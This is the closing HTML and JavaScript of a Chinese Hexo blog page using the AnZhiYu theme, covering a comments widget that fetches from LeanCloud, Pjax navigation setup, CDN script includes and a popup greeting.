    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
</script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><script src="/js/anzhiyu/right_click_menu.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>